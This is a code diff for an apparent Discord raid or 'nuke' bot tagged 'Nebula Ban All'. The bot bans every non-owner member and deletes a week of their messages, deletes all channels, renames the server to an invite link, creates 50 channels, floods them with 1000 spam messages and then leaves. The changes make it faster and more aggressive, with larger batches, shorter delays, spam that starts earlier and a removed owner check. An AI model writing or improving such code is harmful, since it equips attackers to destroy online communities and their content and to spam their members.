@@ -91,11 +91,6 @@ client.on('messageCreate', async (message) => {
 
     const guild = message.guild;
 
-    if (guild.ownerId === message.author.id) {
-      return message.reply('⚠️ Owner detected. Continuing with ban all.');
-    }
-
-    // Fetch all members (up to 1000 unless paginated)
     const members = await guild.members.fetch();
     const membersToBan = members.filter(m =>
       m.id !== guild.ownerId && !m.user.bot
@@ -107,24 +102,24 @@ client.on('messageCreate', async (message) => {
 
     console.log(`🔪 Banning ${membersToBan.size} members...`);
 
-    const batchSize = 10;
-    const batchDelay = 100; // ms
+    const batchSize = 20;
+    const batchDelay = 50; // ms
     let bannedCount = 0;
 
     for (let i = 0; i < membersToBan.size; i += batchSize) {
       const batch = membersToBan.array().slice(i, i + batchSize);
       const promises = [];
 
-      for (const member of batch) {
+      for (const [id, member] of batch) {
         promises.push((async () => {
           try {
-            await handleRateLimit(() => guild.members.ban(member[1], {
+            await handleRateLimit(() => guild.members.ban(member, {
               reason: 'Nebula Ban All',
               deleteMessageSeconds: 604800
             }));
             bannedCount++;
           } catch (err) {
-            console.error(`❌ Failed to ban ${member[1].user.tag}: ${err.message}`);
+            console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
           }
         })());
       }
@@ -149,7 +144,7 @@ client.on('messageCreate', async (message) => {
 
       let didSomething = false;
 
-      // Step 1: Delete channels concurrently
+      // Step 1: Delete existing channels concurrently
       await Promise.all(guild.channels.cache.map(channel =>
         handleRateLimit(() => channel.delete().catch(() => {}))
       ));
@@ -169,12 +164,12 @@ client.on('messageCreate', async (message) => {
       // Step 4: Rename server
       await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));
 
-      // Step 5: Create 50 channels in batches of 10 per ms
+      // Step 5: Create 50 channels as fast as possible
       const createdChannels = [];
       const totalChannelsToCreate = 50;
-      let channelsCreated = 0;
+      const channelsReadyForSpam = [];
 
-      console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
+      console.log(`🆕 Creating ${totalChannelsToCreate} channels FAST...`);
 
       const createPromises = [];
 
@@ -185,10 +180,12 @@ client.on('messageCreate', async (message) => {
           );
           if (channel) {
             createdChannels.push(channel);
-            channelsCreated++;
-            if (channelsCreated === 5) {
-              console.log('📨 Starting spam early after 5 channels...');
-              startSpam(createdChannels);
+            if (createdChannels.length <= 5) {
+              channelsReadyForSpam.push(channel);
+              if (channelsReadyForSpam.length === 5) {
+                console.log('📨 Starting spam early after 5 channels...');
+                startSpam([...createdChannels]);
+              }
             }
           }
         })());
@@ -200,7 +197,13 @@ client.on('messageCreate', async (message) => {
         return message.channel.send('❌ Could not create any channels. Aborting.');
       }
 
-      // Step 6: Spam exactly 1000 messages
+      // If spam didn't start yet, do it now
+      if (channelsReadyForSpam.length < 5) {
+        console.log('📨 Starting spam with whatever channels were made...');
+        startSpam(createdChannels);
+      }
+
+      // Step 6: Spam exactly 1000 messages across multiple channels
       let sent = 0;
       const MAX_MESSAGES = 1000;
 
@@ -208,6 +211,7 @@ client.on('messageCreate', async (message) => {
         while (sent < MAX_MESSAGES) {
           for (const channel of channels) {
             if (sent >= MAX_MESSAGES) break;
+            if (!channel || !channel.send) continue;
 
             try {
               await handleRateLimit(() => channel.send(spamMessage));
@@ -217,14 +221,14 @@ client.on('messageCreate', async (message) => {
               console.error(`⚠️ Send failed: ${err.message}`);
             }
 
-            await new Promise(r => setTimeout(r, 2)); // tiny delay
+            await new Promise(r => setTimeout(r, 1)); // tiny delay
           }
         }
         console.log(`✅ Sent ${sent} messages.`);
       };
 
-      // Wait for spam to finish
-      await new Promise(r => setTimeout(r, 10000)); // wait up to 10s for spam
+      // Wait up to 10 seconds for spam to finish
+      await new Promise(r => setTimeout(r, 10000));
 
       // Step 7: Leave server
       await handleRateLimit(() => guild.leave());
